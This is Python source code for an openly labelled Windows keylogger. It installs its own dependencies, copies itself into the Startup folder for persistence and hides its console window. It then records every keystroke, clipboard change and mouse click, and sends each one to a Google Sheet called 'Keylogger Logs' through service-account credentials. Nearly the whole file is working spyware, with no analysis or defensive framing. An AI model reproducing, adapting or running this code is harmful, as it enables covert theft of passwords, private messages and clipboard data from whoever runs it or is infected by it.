import os
import subprocess
import sys
import shutil
import time
import logging
import threading
import ctypes
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
import pyperclip  # Clipboard handling

STOP_FLAG = threading.Event()

# 🔥 Auto-install missing modules
def install_modules():
    required_modules = ["pynput", "pyperclip", "gspread", "oauth2client"]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.call([sys.executable, "-m", "pip", "install", module])

install_modules()

# 🔥 Google Sheets API Authentication
def connect_to_google_sheets():
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
    client = gspread.authorize(creds)
    
    sheet = client.open("Keylogger Logs").sheet1  # Open Google Sheet
    return sheet

SHEET = connect_to_google_sheets()

# 🔥 Windows Persistence (Add to Startup)
def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    exe_path = os.path.abspath(sys.argv[0])

    if not exe_path.startswith(startup_path):
        shutil.copy(exe_path, os.path.join(startup_path, "keylogger.exe"))

add_to_startup()
ctypes.windll.kernel32.FreeConsole()

# 🔥 Set up logging locally
LOG_FILE = "log.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# 🔥 Stop Keylogger with Special Keystroke ("STOPLOG")
STOP_KEYWORD = "STOPLOG"
buffer = ""

# 🔥 Function to log keystrokes
def log_keystroke(key):
    global buffer
    key = str(key).replace("'", "")

    # Replace special keys with readable text
    replacements = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "[TAB]",
        "Key.shift": "[SHIFT]",
        "Key.ctrl_l": "[CTRL]",
        "Key.alt_l": "[ALT]",
        "Key.backspace": "[BACKSPACE]"
    }
    key = replacements.get(key, key)

    buffer += key  # Append typed characters to buffer

    # Check if stop keyword is typed
    if STOP_KEYWORD in buffer:
        print("🛑 STOP COMMAND DETECTED! Exiting keylogger...")
        STOP_FLAG.set()  # 🔥 Set stop flag
        os._exit(0)  # 🔥 Force kill the process

    logging.info(f"Key: {key}")  # Save to local file
    SHEET.append_row([time.strftime("%Y-%m-%d %H:%M:%S"), key])  # Send to Google Sheets

# 🔥 Function to log clipboard data
def log_clipboard():
    last_clipboard = ""
    while not STOP_FLAG.is_set():
        try:
            clipboard_data = pyperclip.paste()
            if clipboard_data != last_clipboard:
                last_clipboard = clipboard_data
                logging.info(f"Clipboard: {clipboard_data}")
                SHEET.append_row([time.strftime("%Y-%m-%d %H:%M:%S"), f"Clipboard: {clipboard_data}"])
        except Exception as e:
            logging.error(f"Clipboard Error: {str(e)}")
        time.sleep(5)

# 🔥 Function to log mouse clicks
def log_mouse_click(x, y, button, pressed):
    if pressed:
        logging.info(f"Mouse Click: {button} at {x},{y}")
        SHEET.append_row([time.strftime("%Y-%m-%d %H:%M:%S"), f"Mouse Click: {button} at {x},{y}"])

# Start background clipboard logging
clipboard_thread = threading.Thread(target=log_clipboard, daemon=True)
clipboard_thread.start()

# Start keylogger and mouse listener
keyboard_listener = Listener(on_press=log_keystroke)
mouse_listener = MouseListener(on_click=log_mouse_click)

keyboard_listener.start()
mouse_listener.start()

# 🔥 Run until STOPLOG is detected
while not STOP_FLAG.is_set():
    time.sleep(0.1)

# 🔥 Stop listeners properly
keyboard_listener.stop()
mouse_listener.stop()

print("✅ Keylogger stopped successfully.")
os._exit(0)  # 🔥 Forcefully exit the EXE process
